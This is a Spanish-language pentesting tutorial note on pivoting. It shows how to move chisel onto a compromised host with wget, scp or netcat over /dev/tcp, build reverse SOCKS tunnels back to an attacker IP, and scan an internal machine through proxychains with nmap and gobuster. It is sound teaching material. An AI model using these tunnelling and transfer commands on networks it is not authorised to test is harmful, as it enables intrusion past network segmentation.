----
- Tags: #avanzado #teoria #practica
----

# ¿ Que es el **pivoting** ?

### El **pivoting** (También conocido como "*hopping*") es una técnica utilizada en pruebas de penetración y en el análisis de redes que implica el uso de una máquina comprometida para atacar otras máquinas o redes en el mismo entorno.

### Por ejemplo, si un atacante ha comprometido una máquina en una red corporativa, puede utilizar técnicas de pivoting para utilizar esa máquina como punto de salto para atacar otras máquinas en la misma red que de otra manera no serían accesibles. Esto se logra a través de la creación de túneles de comunicación desde la máquina comprometida a otras máquinas en la red.

### El pivoting puede ser utilizado para superar restricciones de seguridad que de otra manera impedirían a un atacante acceder a determinadas máquinas o redes. Por ejemplo, si una red corporativa utiliza segmentación de red para separara diferentes partes de la red, el pivoting puede ser utilizado para superar esta restricción y permitir que un atacante salte de una red a otra. 

----

# Conceptos 

### Como sabemos el pivoting consiste en movernos desde una máquina a otra, pudiendo así llegar a tener conexión con máquinas las cuales previamente no contabamos con traza, esto se puede hacer de múltiples formas, pero una herramienta muy utilizada para el pivoting es [chisel]('https://github.com/jpillora/chisel/releases'), la cual hay que correr desde la máquina atacante como **server** y desde la/s máquina/s victima/s como **client**. 

### Una vez que tengamos **chisel** en nuestra máquina, si deseamos hacer pivoting entre la *Máquina 1* con la *Máquina 2* para llegar a una *Máquina 3*, deberiamos trasladar el chisel a nuestra *Máquina 2*, para eso existen varías maneras (Ignorando el descargarlo desde google)

### Con **python**: 
```bash
# Máquina 1 en donde este el {binary}: 
python3 -m http.server {port}
# Máquina 2: 
wget http://{ip}:{port}/{binary}
```

### Si tenemos *ssh* configurado con un *authorized_keys* en el directorio root: 
```bash
scp {binary} root@{ip}:/{path}
```

### Con **netcat**: 
```bash
# Máquina 1: 
nc -nvlp {port} < {binary}
# Máquina 2: 
cat < /dev/tcp/{ip}/{port} > {name_binary}
```

### Una vez que tengamos **chisle** en la *Máquina 2* que tiene conexión con la *Máquina 3* con la cual nuestra *Máquina 1* no tiene conexión, en nuestra máquina de atacante (La *Máquina 1*) deberíamos crear el *server* de chisel: 

```bash
./chisel server --reverse -p 1234
```

### Mientras que si quisieramos compartir un puerto especifico de la Máquina 3 desde la Máquina 2 para poder acceder desde la Máquina 1, podríamos ejecutar:
```bash
# Desde nuestra Máquina 2 conectarnos a nuestro server de chisel haciend port forwarding de un puerto de la máquina 3 a nuestra máquina por el puerto 8899
./chisel client {IP_atacante}:1234 R:{Máquina3_port}:{Máquina3_IP}:8899
```

### Al ejecutar el comando de arriba,  si bien no tenemos conexión con la Máquina 3, la Máquina 2 se esta conectando a nuestro servidor de chisel brindando la disponibilidad de un puerto seleccionado de la Máquina 3 y permitiendonos acceder a este en un puerto seleccionado (Ej: 8899)

### Pero también podemos permitir acceso a todos los puertos para no tener que jugar puerto por puerto, de manera que si lo que nos interesa es tener completa conexión con la Máquina 3 desde la Máquina 1, en la Máquina 2 podríamos ejecutar el siguiente comando: 
```bash
./chisel client {IP_atacante}:1234 R:8899:socks
```

### De esta manera, por el puerto indicado (8899, si no especificamos 'R:socks' se habré por defecto el 1080) tendríamos conexión desde la Máquina 1 a la Máquina 3 pasando por este tunel. 

#### Recordemos que así como podemos establecer un tunel a la vez podemos traernos un puerto especifico así como un protocolo distinto: 
```bash
./chisel client {IP_atacante}:1234 R:socks R:443:{Máquina3_IP}:443/udp
```

### Pero una vez creado el tunel, tenemos que agregar este en el archivo **/etc/proxychains4.conf**, al tratarse de un único tunel descomentamos la línea que dice **strict_chain** y al final de todo agregamos la línea **"socks5 127.0.0.1 8899"** para indicar que cuando usemos la herramienta **proxychains** y esta leea del archivo de configuración, entienda que tiene que pasar por el tunel levantado en nuestro localhost por el puerto indicado (Ej. 8899)

### Por ende, si desde nuestra Máquina 1 (Atacante) indicamos un escaneo a la máquina 3, no podremos, pero jugando con **proxychains** esta herramienta leera del archivo  **/etc/proxychains4.conf** donde configuramos un **socks5** en nuestro localhost por el puerto indicado. 
```bash
# No encontrara el host
nmap -p- --min-rate 5000 -vvv -Pn -n {Máquina3_IP}
# Encontrara el host 
proxychains nmap -Pn -sT -p- --min-rate 5000 -vvv -n {Máquina3_IP}
```
#### ACLARACIÓN: Para que funcione nmap a través del proxychain es necesario el parametro -Pn y -sT. 

### Si queremos que el escaneo con nmap vaya más rapido, podríamos usar el siguiente comando:
```bash
seq 1 65535 | xargs -P 500 -I {} proxychains nmap -Pn -sT -p{} -T5 -n -v --open {Máquina3_IP} 2>&1 | grep "tcp open"
```

### A partir de aquí, todo es necesario que pase por el **proxychain**, ejemplos: 
```bash
# No encontrara el host
whatweb http://{Máquina3_IP}
# Encontrara el host
proxychains whatweb http://{Máquina3_IP}

# No encontrara el host 
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://{Máquina3_IP} -r -t 20 -x php,txt,html,js,py
# Encontrara el host PERO ira bastante lento
proxychains gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://{Máquina3_IP} -r -t 20 -x php,txt,html,js,py
# Encontrara el host y sera más OPTIMO 
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://{Máquina3_IP} -r -t 20 -x php,txt,html,js,py --proxy socks5://127.0.0.1:8899
```

### A nivel de navegador, podríamos hacer uso de herramientas como **foxy proxy** para configurar un proxy de tipo **SOCKS5** y poder así llegar a la máquina, la configuración del mismo debería estar vinculada al localhost por el puerto  indicado (Ej.*8899*) 